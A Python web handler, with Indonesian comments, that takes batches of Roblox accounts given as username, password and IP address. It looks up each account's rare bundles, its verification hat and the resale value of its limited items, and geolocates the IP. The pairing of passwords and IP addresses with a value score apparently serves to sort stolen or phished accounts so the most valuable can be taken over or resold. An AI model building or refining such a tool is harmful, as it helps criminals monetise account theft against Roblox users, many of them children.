from http.server import BaseHTTPRequestHandler
import json
import urllib.request
import urllib.error
import concurrent.futures

VERIFIED_ITEM_ID = 102611803

# Bundle ID resmi Roblox + harga Robux-nya (bukan RAP)
BUNDLES = {
    201: ("Headless Horseman", 31000),
    192: ("Korblox Deathspeaker", 17000),
    1693: ("Malivinius", 300)
}

def req_json(url, method="GET", payload=None, timeout=6):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "application/json"
    }
    data = json.dumps(payload).encode("utf-8") if payload else None
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as res:
            return res.status, json.loads(res.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        return e.code, None
    except Exception:
        return 500, None

def get_country(ip):
    if not ip or ip in ("-", "N/A", "Unknown") or ":" in ip:
        return "Unknown"
    st, data = req_json(f"https://ipwho.is/{ip}", timeout=4)
    if st == 200 and data and data.get("success"):
        return data.get("country", "Unknown")
    return "Unknown"

def has_item(uid, item_type, item_id):
    st, data = req_json(f"https://inventory.roblox.com/v1/users/{uid}/items/{item_type}/{item_id}", timeout=5)
    return st == 200 and data and len(data.get("data", [])) > 0

def scan_one(acc):
    usn = acc.get("usn", "").strip()
    pw = acc.get("pass", "-")
    ip = acc.get("ip", "-")

    out = {
        "usn": usn, "pass": pw, "ip": ip, "location": "Unknown",
        "name": usn, "id": None, "is_banned": False, "avatar_url": "",
        "total_rap": 0, "bundle_value": 0, "limited_found": [], "limited_items": [],
        "has_verified": False, "is_private": False
    }
    if not usn:
        return out

    st, udata = req_json("https://users.roblox.com/v1/usernames/users", "POST", {"usernames": [usn], "excludeBannedUsers": False})
    if st != 200 or not udata or not udata.get("data"):
        return out

    uid = udata["data"][0]["id"]
    out["id"] = uid
    out["name"] = udata["data"][0].get("displayName", usn)

    _, av = req_json(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={uid}&size=150x150&format=Png&isCircular=false")
    if av and av.get("data"):
        out["avatar_url"] = av["data"][0].get("imageUrl", "")

    # Cek Topi Hijau Verifikasi Email (Asset 102611803)
    out["has_verified"] = has_item(uid, "Asset", VERIFIED_ITEM_ID)

    # Cek Bundle Spesial (Headless, Korblox, Malivinius)
    found_names = []
    limited_items = []
    bundle_val = 0
    for bid, (label, price) in BUNDLES.items():
        if has_item(uid, "Bundle", bid):
            found_names.append(label)
            limited_items.append({"name": label, "rap": 0, "bundle_price": price, "is_bundle": True})
            bundle_val += price

    # Cek Item Limited & RAP per item
    st_col, col = req_json(f"https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?limit=100")
    if st_col == 403:
        out["is_private"] = True
    elif st_col == 200 and col:
        rap = 0
        for it in col.get("data", []):
            item_rap = it.get("recentAveragePrice") or 0
            item_name = it.get("name") or "Unknown Limited"
            rap += item_rap
            if item_name not in found_names:
                found_names.append(item_name)
            limited_items.append({"name": item_name, "rap": item_rap, "is_bundle": False})
        out["total_rap"] = rap

    out["bundle_value"] = bundle_val
    out["limited_found"] = found_names
    out["limited_items"] = limited_items
    out["location"] = get_country(ip)
    return out

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            body = json.loads(self.rfile.read(length).decode("utf-8"))
            accounts = body.get("accounts", [])

            with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
                results = list(ex.map(scan_one, accounts))

            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"results": results}).encode("utf-8"))
        except Exception as e:
            self.send_response(500)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"error": str(e)}).encode("utf-8"))
